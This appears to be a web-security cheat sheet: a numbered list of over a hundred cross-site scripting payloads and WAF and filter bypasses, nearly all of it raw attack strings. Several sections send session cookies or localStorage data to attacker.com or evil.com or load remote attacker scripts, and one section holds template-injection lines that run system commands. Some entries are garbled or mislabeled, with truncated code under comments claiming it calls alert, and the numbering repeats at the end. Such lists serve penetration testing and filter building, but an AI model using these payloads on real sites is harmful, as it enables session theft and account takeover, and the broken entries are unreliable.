
### **1. Basic XSS Payloads**
These are simple payloads typically used for testing.

```html
<script>alert('XSS')</script>
<svg/onload=alert('XSS')>
<img src=x onerror=alert('XSS')>
<iframe src="javascript:alert('XSS');"></iframe>
<math><mtext><title>1</title><mtext><style><img src=x onerror=alert(1)> // MathML vector
<marquee onstart=alert('XSS')>Test</marquee>
<details open ontoggle=alert('XSS')>Test</details>
<isindex type=image src=1 onerror=alert('XSS')>
```

### **2. Event Handler-Based Payloads**
XSS vectors relying on event attributes.

```html
<img src="x" onerror="alert('XSS')">
<body onload=alert('XSS')>
<input type="button" value="Click" onclick="alert('XSS')">
<div onmouseover="alert('XSS')">Mouse over me</div>
<a href="javascript:alert('XSS')">Click me</a>
```

### **3. JavaScript Protocol Injection**
Injecting via JavaScript URI.

```html
<a href="javascript:alert('XSS')">Click me</a>
<iframe src="javascript:alert('XSS');"></iframe>
<object data="javascript:alert('XSS');"></object>
```

### **4. HTML Attribute Injection**
Payloads placed within an HTML tag’s attribute to break out of the context.

```html
<input type="text" value="XSS" onfocus="alert('XSS')" autofocus>
<form action="test" onsubmit="alert('XSS')"><input type="submit"></form>
<textarea autofocus onfocus="alert('XSS')">Text</textarea>
```

### **5. SVG and Vector Image Payloads**
Leverage vector image formats such as SVG for XSS.

```html
<svg/onload=alert('XSS')>
<svg><desc><![CDATA[<script>alert('XSS')</script>]]></desc></svg>
<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml" onload="alert('XSS')"></body></foreignObject></svg>
```

### **6. Advanced Injection Techniques**
Involving bypassing filters or making injections harder to detect.

```html
<svg><script>alert`1`</script></svg>  // Using backticks
<script x=">" src="http://attacker.com/xss.js"></script>  // Attribute confusion
<iframe srcdoc="<script>alert('XSS')</script>"></iframe>  // srcdoc attribute
<script>const alert=window.alert.bind(window);alert('XSS')</script> // JavaScript function binding
```

### **7. DOM-Based XSS Payloads**
Payloads targeting insecure JavaScript code.

```html
<script>document.write('<img src="x" onerror="alert(\'XSS\')">');</script>
<input id="test" oninput="location.href='javascript:alert('+this.value+')'">
```

### **8. HTML5 and Modern Techniques**
Taking advantage of new HTML5 elements.

```html
<video><source onerror="alert('XSS')"></video>
<keygen autofocus onfocus=alert(1)>
<audio src onloadstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>X</meter>
<output onforminput="alert(1)">X</output>
<progress value=10 max=100 onclick=alert(1)>Progress</progress>
```

### **9. Malformed Tags or Encoded Bypasses**
Use malformed tags or entities to bypass filters.

```html
<scr<script>ipt>alert('XSS')</scr<script>ipt>  // Broken up script tag
<script>alert(String.fromCharCode(88,83,83))</script>  // Obfuscated alert using char codes
<scr%0ipt>alert('XSS')</scr%0ipt>  // Using URL-encoded characters
```

### **10. URL Parameter-Based XSS**
Payloads embedded in the query string.

```
http://example.com/index.php?name=<script>alert('XSS')</script>
http://example.com/?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E
javascript:eval("alert('XSS')")
```

### **11. Cookie Theft via XSS**
Using JavaScript to steal cookies.

```html
<script>document.location='http://attacker.com/?cookie='+document.cookie</script>
<img src="x" onerror="fetch('http://attacker.com?cookie='+document.cookie)">
<script>new Image().src="http://attacker.com/"+document.cookie;</script>
```

### **12. XSS in Contexts Other Than HTML**
Injected into JSON, XML, or other non-standard contexts.

```javascript
{"name":"<script>alert('XSS')</script>"}
<username><![CDATA[<script>alert('XSS')</script>]]></username>
```

### **13. AngularJS Template Injection**
Leverage AngularJS templating system.

```html
{{constructor.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;$eval('alert(1)')}}
```

### **14. Exploiting InnerHTML Vulnerabilities**
Common with dynamic JavaScript rendering using `.innerHTML`.

```html
<script>document.body.innerHTML='<img src=x onerror=alert(1)>';</script>
<div id="div1" onclick="document.getElementById('div1').innerHTML='<img src=x onerror=alert(1)>'">Click me</div>
```

### **15. XSS Payloads Exploiting CSS**
Using CSS injection to trigger JavaScript.

```html
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
<style>body{background:url('javascript:alert(1)')}</style>
```

### **16. Event Handler Abusing HTML5 Elements**
New event handlers introduced with HTML5.

```html
<input onblur="alert('XSS')" autofocus>
<body ononline="alert('XSS')">
<select onchange="alert('XSS')"><option>1</option><option>2</option></select>
```

### **17. HTML Comment Injection**
Attempting XSS via HTML comment manipulation.

```html
<!--<script>alert(1)</script> -->
<!-- Comment trick --><script>alert(1)</script>
```

### **18. Multipart Payloads and Bypasses**
Payloads spread across multiple elements to evade WAFs and filters.

```html
<scr<script>ipt>alert('XSS')</scr<script>ipt>
```

### **19. Flash and VML Payloads**
Exploiting legacy technologies.

```html
<vmlframe src="javascript:alert('XSS')"></vmlframe>
<embed src="data:image/svg+xml;base64,..." allowScriptAccess="always"></embed>
```

### **20. Stored XSS Payloads**
Used for persistence in databases.

```html
<script>fetch('http://attacker.com', {method: 'POST', body: document.cookie})</script>
<div data-xss="<img src=x onerror=alert('XSS')>"></div>
<script>localStorage.setItem('payload','<img src=x onerror=alert(1)>');</script>
```

### **21. Using Fetch or XMLHttpRequest**
Stealing information via web requests.

```javascript
<script>fetch('http://evil.com',{method:'POST',body:document.cookie})</script>
<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://attacker.com',true);xhr.send(document.cookie);</script>
```
  
### **22. Blind XSS Payloads**
Blind XSS payloads are often used when you do not see the immediate result but need to send data to an external server for verification.

```html
<script>new Image().src="http://attacker.com/?cookie="+document.cookie;</script>
<img src="x" onerror="fetch('http://attacker.com/blindxss?data='+document.cookie)">
<svg/onload="fetch('http://attacker.com?xss='+btoa(document.cookie))">
<iframe src="javascript:fetch('http://attacker.com/blind?cookie='+encodeURIComponent(document.cookie))"></iframe>
<script>document.location='http://attacker.com/blind/?cookie='+document.cookie</script>
```

### **23. Base64 Encoded Payloads**
Encoding the payload in Base64 to evade detection.

```html
<svg><script>eval(atob('YWxlcnQoMSk='))</script></svg>  // "alert(1)" in Base64
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoJ1hTUycpPg==">  // Base64 encoded payload with alert('XSS')
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>  // Base64 HTML with alert(1)
```

### **24. URL Encoding and Double Encoding**
Using URL encoding to obfuscate scripts and bypass filters.

```html
%3Cscript%3Ealert('XSS')%3C%2Fscript%3E  // <script>alert('XSS')</script>
<iframe src="javascript%3Aalert%28%27XSS%27%29"></iframe>
<img src="javascript%3A%2520alert%28%27XSS%27%29">
```

### **25. UTF-16/Unicode Encoding**
Payloads that use alternative character encodings to bypass security.

```html
<script>alert('\u0041\u0042\u0043')</script>  // Unicode for "ABC"
<script>alert(String.fromCharCode(88,83,83))</script>  // XSS in character codes
<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>  // Unicode for alert(1)
```

### **26. Polyglot XSS Payloads**
Polyglot payloads can execute as HTML, JavaScript, CSS, or other contexts to ensure broad applicability.

```html
"><img src=x onerror=alert(1)>'"><script>alert(1)</script>
"><svg onload="alert('XSS')"></svg> --><p " --><svg onload=alert(1)></svg>
'";alert(String.fromCharCode(88,83,83))//</script>
```

### **27. Using Non-Printable Characters**
Use control characters to bypass filters that do not handle them properly.

```html
<svg/onload=\x0Aalert(1)>
<script>alert('XSS')</script>\x0B  // Non-printable characters
```

### **28. Mixed Context Injection**
Payloads that abuse JavaScript, HTML, and CSS mixed together.

```html
<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
"><style>body{background:url("javascript:alert('XSS')")}</style>
"><iframe src="javascript:`/*--><svg onload=alert(1)><!--*/`"></iframe>
```

### **29. HTML5 Cross-Browser Quirks**
Exploiting specific quirks across different HTML5 elements and attributes.

```html
<object type="image/svg+xml" data="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert('XSS')</script></svg>"></object>
<video><source onerror="alert('XSS')"></video>
<xss id="test"/x="><img src=x onerror=alert(1)>">
<div draggable="true" ondrag="alert('XSS')">Drag me</div>
```

### **30. JavaScript Prototype Pollution**
Using prototype pollution to trigger JavaScript execution.

```html
<script>
  Object.prototype.x = function() {alert('XSS')};
  [].x();
</script>
```

### **31. Data URIs for XSS Payload Delivery**
Using data URIs to deliver XSS payloads.

```html
<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
<a href="data:text/html,<script>alert('XSS')</script>">Click me</a>
```

### **32. Null Byte Injection**
Use null bytes to terminate strings early or confuse parsers.

```html
<script\x00>alert('XSS')</script>
<img src="x" onerror="alert(String.fromCharCode(0x00))">
```

### **33. XSS via Metadata Tags**
Using `<meta>` tags in certain scenarios to trigger XSS.

```html
<meta http-equiv="refresh" content="0; url=javascript:alert(1)">
<meta charset="utf-7"><script>alert('XSS')</script>  // Works with old IE browsers
```

### **34. XSS Payloads Using Document and Window**
Using JavaScript window and document objects to extract sensitive information.

```html
<script>document.location='http://attacker.com?cookie='+document.cookie</script>
<script>window.open('http://attacker.com/?cookie='+document.cookie)</script>
<script>new Image().src='http://attacker.com/log?key='+localStorage.getItem('user_key');</script>
```

### **35. XSS Using JavaScript Comments**
Comment-based payloads to make detection more difficult.

```html
<script>/*alert('XSS')*/alert(1)//</script>
<!--<img src="x" onerror="alert('XSS')">-->
<script>//<!--alert('XSS')</script>
```

### **36. Blind XSS in Headers**
Often useful in APIs where headers are rendered directly in logs.

```
User-Agent: "><script>alert('XSS')</script>
Referer: javascript:alert('XSS')
Content-Type: text/html;charset=UTF-7
```

### **37. SVG and XML Entities Abuse**
Payloads that leverage SVG and XML entities.

```html
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')"></svg>
```

### **38. NoScript Contexts (Injection in Non-Script Tags)**
Inject XSS payloads in attributes that are not meant for scripts.

```html
<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext><title><![CDATA[<img src="x" onerror="alert(1)">]]></title></mtext></math>
<div id="div1" onclick="document.getElementById('div1').innerHTML='<img src=x onerror=alert(1)>'">Click me</div>
```

### **39. XSS in Template Engines**
Payloads designed to abuse popular web template engines (e.g., JSP, Thymeleaf, Jinja).

```html
${@java.lang.Runtime@getRuntime().exec('calc')}
{{constructor.constructor('alert(1)')()}}
#{T(java.lang.Runtime).getRuntime().exec('touch /tmp/pwned')}
```

### **40. XSS Using CSS (Style Attribute)**
CSS injection leveraging HTML attributes to trigger JavaScript.

```html
<div style="background-image:url(javascript:alert('XSS'))">Test</div>
<style>body{color:expression(alert(1))}</style>  // Obsolete in newer versions of IE
```

### **41. XSS via XPath Injection**
XPath injections with inline JavaScript.

```xml
<name>
  <![CDATA[<script>alert('XSS')</script>]]>
</name>
```

### **42. Obfuscated JavaScript Techniques**
Using obfuscation to evade detection, such as self-executing functions.

```html
<svg><script>(function(){alert(1)})()</script></svg>
<script>eval('al'+'ert(1)')</script>
<script>Function('ale'+'rt(1)')()</script>
<script>$=String;$($('al'+'ert(1)'))()</script>
```

### **43. Filter Bypass Techniques**
Using different encodings and bypass tricks to avoid typical XSS filters.

```html
<scr%0ipt>alert(1)</scr%0ipt>
<script>al\ert(1)</script>  // Bypassing simplistic "alert" filter
<scr<script>ipt>alert('XSS')</scr<script>ipt>
```

### **44. WAF Bypass Techniques with Modified Syntax**
These techniques leverage different ways to write payloads that may not match a WAF's strict rules.

```html
<script>alert`1`</script>  // Using backticks instead of parentheses
<script>alert&#40;1&#41;</script>  // HTML entity encoding
<script src=data:text/javascript,alert(1)></script>  // Data URI usage
<script>self </script>  // Using property lookup
<script>this </script>  // Concatenation in function name
<svg/onload="top ">  // Obfuscation through numbers
```

### **45. HTML Entity and Mixed Encoding Techniques**
Using HTML entities and mixed character encoding to slip past WAF rules.

```html
<scr<script>ipt>alert(String.fromCharCode(88,83,83))</scr<script>ipt>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<svg/onload=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<script>alert('\x58\x53\x53')</script>  // Hexadecimal encoding
<iframe src="javascript&colon;alert&lpar;1&rpar;"></iframe>  // Colon and parentheses HTML encoding
```

### **46. Bypassing Common HTML Attribute Restrictions**
Using unconventional characters, malformed attributes, and malformed tags.

```html
<img sRc=X oNERror=alert(1)>  // Capital letters to bypass case-sensitive filters
<img src=1 href=1 onerror='javascript:/*--></script><script>alert(1)//'>
<sVg><scRiPt>alert(1)</sCriPt></svG>  // SVG combined with scripting to confuse filters
<form><button formaction="javascript:alert(1)">Click Me</button></form>  // Button with formaction
<video><source onerror="alert(1)"></video>
```

### **47. Random Whitespaces and Newline Characters**
Adding arbitrary spaces, newlines, or invisible characters to bypass WAF pattern matching.

```html
<scr  ipt>alert(1)</scr  ipt>
<script
>alert('XSS')</script>
<svg onload="aler
t(1)">
<IMG SRC=javascript: alert('XSS')>  // Whitespace between "javascript:" and "alert"
<input value="``onmouseover='alert(1)'">
```

### **48. In-line JavaScript Comments to Break Patterns**
Using in-line comments to disrupt typical WAF signatures.

```html
<script>/*alert*/(1)</script>
<script>/*-alert-*/(1)</script>
<script>self['ale'+'rt']/*alert*/(1)</script>
<svg/onload="al/*comment*/ert(1)">
```

### **49. Broken or Split Tags**
Splitting important parts of the script to confuse pattern matching.

```html
<scr<script>ipt>alert('XSS')</scr<script>ipt>
<svg><scri</svg>pt>alert(1)</script>
<scri%00pt>alert('XSS')</scri%00pt>  // Null byte insertion
<scri</scri>pt>alert('XSS')</script>  // Closing the script in unexpected ways
```

### **50. WAF Bypass with Improper Unicode Handling**
Using mixed character sets that exploit improper Unicode parsing in the WAF.

```html
<scrіpt>alert(1)</scrіpt>  // Using a Cyrillic 'і' instead of the Latin 'i'
<scrīpt>alert(1)</scrīpt>  // Unicode look-alike characters
<iframe src="javas\u0063ript:alert(1)"></iframe>  // Unicode escape
```

### **51. Non-Standard Protocol Usage**
Leveraging non-standard protocols and pseudo-protocols.

```html
<iframe src="javascript:alert(1)"></iframe>
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>  // Data URI with base64 encoded JavaScript
<img src="javascript:alert(1)">  // Usage of `javascript:` in image src
<img src="vbscript:msgbox('XSS')">  // VBScript (in very old IE versions)
```

### **52. JavaScript Protocol Wrapping**
Bypass using different JavaScript wrappers and encodings.

```html
<a href="java&#x09;script:alert(1)">Click here</a>  // Tab character between "javascript"
<iframe src="javascript:/*-alert(1)"></iframe>
<svg><script>this.onerror=alert;throw 1</script></svg>
<a href="java&#x0D;script:alert(1)">Click here</a>  // Carriage return
```

### **53. HTML 5 and SVG Content Bypasses**
Exploiting new HTML5 features and SVG quirks to slip through WAFs.

```html
<details open ontoggle="alert(1)">Click Me</details>
<svg><use xlink:href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script>"></use></svg>
<meter value="2" min="0" max="10" onmouseover="alert(1)">2</meter>
<foreignObject><body onload=alert(1)></body></foreignObject>  // In SVG context
```

### **54. CSS and Style Injection Techniques**
Injecting CSS to trigger JavaScript or abusing the `style` tag.

```html
<div style="width:expression(alert(1))">X</div>  // Internet Explorer-specific CSS
<x style="behavior:url(#default#time2)" onbegin="alert(1)">  // IE behaviors
<style>@import 'javascript:alert(1)';</style>  // Leveraging CSS @import
<div style="background:url(javascript:alert(1))">CSS Injection</div>
```

### **55. Using HTML Encoding Bypass**
Combining multiple encoding methods to confuse security filters.

```html
<script>&#97&#108&#101&#114&#116&#40&#49&#41</script>  // Decimal encoding mixed in a script
<img src='x' one&#x6Eerror=alert(1)>  // Mixing hex and text encoding
<scr&#x69;&#x70;t>alert(1)</scr&#x69;&#x70;t>  // Mixed with hexadecimal for tags
```

### **56. JavaScript Bypass Using Alternate Methods and Properties**
Using alternate ways to execute JavaScript without directly invoking alert or script.

```html
<script>top </script>  // Constructing alert dynamically
<iframe src="javascript:document.body.appendChild(document.createElement('script')).src='//attacker.com/xss.js';"></iframe>
<script>fetch('http://attacker.com/?'+document.cookie)</script>
<script>setTimeout('alert(1)',0)</script>
<svg onload="[].map.call('XSS', eval)">  // Abuse `eval` with `map`
```

### **57. Use of JavaScript Special Characters and Keyword Aliases**
Avoiding keyword-based filters by using JavaScript's flexible syntax.

```html
<script>self</script>  // Evaluates to alert(1)
<script>top </script>  // Alert with numeric trick
<svg onload="confirm.call(this,'XSS')">  // Using alternative function call like `confirm`
```

### **58. Bypass Using HTML5 Interactive Elements**
Injecting XSS vectors within interactive HTML5 elements.

```html
<form><input type="text" value="XSS" autofocus onfocus="alert(1)"></form>
<meter value="0.5" onmouseover="alert(1)">0.5</meter>
<output onforminput="alert(1)">XSS</output>
<keygen autofocus onfocus=alert(1)>  // Exploiting deprecated keygen tag
```

### **59. Self Executing JavaScript Functions**
Using self-executing anonymous functions to trigger XSS.

```html
<script>(function(){alert(1)})();</script>
<script>(()=>alert(1))()</script>
<script>((()=>alert(1)))()</script>
```

**60. Double URL-Encoded JavaScript Payloads**
```html
%253Cscript%253Ealert('XSS')%253C%252Fscript%253E  // Double encoding to bypass WAFs
```

**61. Fragment Identifier Injection**
```html
<a href="http://example.com/#<script>alert(1)</script>">Click Me</a>  // Injecting JavaScript through fragments
```

**62. Hash Character (#) to Bypass Filters**
```html
<script#>alert(1)</script#>  // Bypass some HTML parsers
```

**63. JavaScript Event in Anchor Tag Attribute**
```html
<a href="#" onclick="javascript:alert('XSS')">Click</a>
```

**64. Image src Attribute Using JavaScript URL Scheme**
```html
<img src="javascript:alert('XSS')">
```

**65. Malformed Tags with Missing Closure**
```html
<script>alert('XSS')
```

**66. Exploiting Frame Attributes**
```html
<iframe src="javascript:alert('XSS')"></iframe>
```

**67. Inline JavaScript Execution with JSFiddle URL**
```html
<script src="https://jsfiddle.net/user/external.js"></script>  // External script load
```

**68. JavaScript Execution Through HTML-Encoded Breaks**
```html
<script>alert('line1')\u000Aalert('line2')</script>
```

**69. XSS Injection in JavaScript URL Redirect**
```html
<a href="javascript:document.location='http://attacker.com/?cookie='+document.cookie">Redirect</a>
```

**70. Using JavaScript Constructors for Execution**
```html
<script>alert.constructor('alert(1)')()</script>
```

**71. Polyglot Payload for Both JavaScript and JSON**
```json
{"name":"</script><script>alert(1)</script>"}
```

**72. Abuse of the `<noscript>` Tag**
```html
<noscript><img src="x" onerror="alert(1)"></noscript>
```

**73. Inline Style with JavaScript Execution**
```html
<div style="width:expression(alert(1))">XSS</div>  // Only effective in older IE versions
```

**74. Encoded JavaScript URI Manipulation**
```html
<a href="jav&#x61;script:alert(1)">Click</a>
```

**75. SVG Injection with Script Element**
```html
<svg><script>alert(1)</script></svg>
```

**76. Abuse of ARIA Attributes for Injection**
```html
<div role="alert" aria-live="assertive" onfocus="alert(1)" tabindex="0">Focus me</div>
```

**77. Abuse of Onscroll Event**
```html
<div onscroll="alert(1)">Scroll me</div>
```

**78. Injecting JavaScript into Template Literals**
```javascript
<script>let a = `</script><script>alert(1)</script>`;</script>
```

**79. Dynamic Script Injection Using Blob URLs**
```html
<script>let blob = new Blob(['alert(1)'], {type: 'text/javascript'}); let url = URL.createObjectURL(blob); document.body.appendChild(Object.assign(document.createElement('script'), {src: url}));</script>
```

**80. Abuse of `window.name`**
```html
<script>window.name = '<img src="x" onerror="alert(1)">';</script>
```

**81. Using `<object>` Tag for JavaScript Execution**
```html
<object data="javascript:alert('XSS')"></object>
```

**82. Using `<embed>` Tag for XSS**
```html
<embed src="javascript:alert('XSS')">
```

**83. Injection via Path Traversal in URLs**
```html
http://example.com/%3Cscript%3Ealert(1)%3C/script%3E
```

**84. Template Injection in Handlebars.js**
```html
{{#with "constructor"}}{{this.alert "XSS"}}{{/with}}
```

**85. Injection Using AngularJS ng-csp Bypass**
```html
{{constructor.constructor('alert(1)')()}}
```

**86. Abuse of Event Listeners to Inject JavaScript**
```html
<button id="btn">Click Me</button><script>document.getElementById('btn').addEventListener('click', function() { alert(1); });</script>
```

**87. HTML Audio with Malformed Tag**
```html
<audio src="javascript:alert(1)">Sound</audio>
```

**88. CSS Import URL with JavaScript URI**
```css
@import url('javascript:alert(1)');
```

**89. Exploiting InnerHTML Assignment in JavaScript**
```html
<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>
```

**90. SVG Animation Injection**
```html
<svg><animate onbegin="alert(1)"></animate></svg>
```

**91. Exploiting HTML `<isindex>` Element**
```html
<isindex action="javascript:alert('XSS')">
```

**92. HTML `<listing>` Tag Abuse**
```html
<listing oncopy=alert(1)>Hello</listing>
```

**93. Targeting Cross-Origin Redirects with XSS Payloads**
```html
<a href="//attacker.com/"><img src="javascript:alert(1)"></a>
```

**94. Abuse of `innerText` JavaScript Property**
```html
<script>document.querySelector('body').innerText += '<img src=x onerror=alert(1)>';</script>
```

**95. Use of `<bgsound>` for XSS Execution (IE)**
```html
<bgsound src="javascript:alert(1)">
```

**96. Exploit CSS `background` for XSS**
```html
<div style="background:url(javascript:alert('XSS'))">CSS Background</div>
```

**97. Leverage `window.location` for Redirection-Based XSS**
```html
<script>window.location = 'javascript:alert(1)';</script>
```

**98. Clickjacking Using XSS Payloads**
```html
<iframe src="http://example.com/" style="opacity:0;" onload="alert(1)"></iframe>
```

**99. XSS Injection Using `<keygen>`**
```html
<keygen autofocus onfocus=alert(1)>
```

**100. Inline JavaScript URL with Percent Encoding**
```html
<a href="javascript%3Aalert('XSS')">Click Me</a>
```

**101. Obfuscate Payload Using String Concatenation**
```html
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

**102. CSS Selector Exploit in JavaScript**
```html
<style>div::after {content: "XSS";}</style>
<script>document.querySelector("div").onmouseenter = () => alert(1);</script>
```

**103. Abuse of `<applet>` Tag**
```html
<applet code="javascript:alert(1)"></applet>  // Deprecated but relevant in very old browsers
```

**104. JavaScript Injection Through Query Parameter**
```html
http://example.com/?param=<script>alert('XSS')</script>
```

**105. SVG Use with JavaScript URI**
```html
<svg><use xlink:href="javascript:alert(1)"></use></svg>
```

**106. Exploit via HTML Form Input Value**
```html
<form><input value="XSS" onfocus="alert(1)" autofocus></form>
```

**107. Using `location.hash` to Inject XSS**
```html
<script>location.hash = "javascript:alert(1)";</script>
```

**108. Injection Using JavaScript `.onload` Event Handler**
```html
<img src="x" onload="alert(1)">
```

**109. Using CSS `position:fixed` with JavaScript URL**
```html
<a style="position:fixed;" href="javascript:alert(1)">Fixed</a>
```

**110. Data Attributes for Inline JavaScript**
```html
<button data-action="javascript:alert(1)">Click</button>
```

**111. Execution Using `<menu>` Tag**
```html
<menu type="context" id="menu"><menuitem label="Click me" onclick="alert(1)"></menuitem></menu>
```

**112. Combining JavaScript and CSS in `<svg>`**
```html
<svg><style>@import 'javascript:alert(1)';</style></svg>
```

**113. Payload Split Between Multiple `<script>` Tags**
```html
<script>aler</script><script>t(1)</script>
```

**114. Inline JavaScript Comment to Break Filters**
```html
<script>alert/*hello*/(1)</script>
```

**115. JavaScript Constructor from User Input**
```html
<script>Function.constructor('alert(1)')()</script>
```

**116. Abuse of JavaScript Ternary Operator**
```html
<script>1 ? alert(1) : ''</script>
```

**117. Exploit CSS Visibility Property for Hidden Script**
```html
<div style="visibility:hidden" onclick="alert(1)">Hidden</div>
```

**118. Abusing `<plaintext>` Tag**
```html
<plaintext><script>alert(1)</script>
### **60. Multi-Layer Encoded and Obfuscated XSS Payloads**
Leveraging multiple encoding schemes to evade signature-based filters.
